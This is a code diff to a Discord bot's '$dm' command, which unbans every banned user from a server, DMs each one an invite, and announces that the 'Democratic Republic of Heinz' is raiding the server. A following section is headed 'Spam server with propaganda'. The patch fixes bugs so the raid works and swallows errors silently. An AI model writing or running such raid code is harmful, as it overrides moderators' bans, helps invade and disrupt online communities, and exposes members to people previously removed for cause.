@@ -82,16 +82,16 @@ async def on_message(message):
      # --DM Banned users
      if message.content.lower() == "$dm":
           bannedusers = await message.guild.bans()
-          unban = await message.guild.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
+          unban = await message.channel.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
           for ban in bannedusers:
                try:
                     user = ban.user
-                    await message.guild.unban(user, reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
-                    await user.send("Hi. If you're seeing this message, you were at some point banned from " + message.guild + ". Luckily for you, the Democratic Republic of Heinz has chosen to raid this server, your ban has been revoked, and you have been invited to join us on this raid.")
+                    await user.send("Hi. If you're seeing this message, you were at some point banned from " + message.guild.name + ". Luckily for you, the Democratic Republic of Heinz has chosen to raid this server, your ban has been revoked, and you have been invited to join us on this raid.")
                     await user.send(unban.url)
-                    
+                    await message.guild.unban(user, reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
                except Exception:
                     pass
+                    
 
 
      # --Spam server with propaganda--
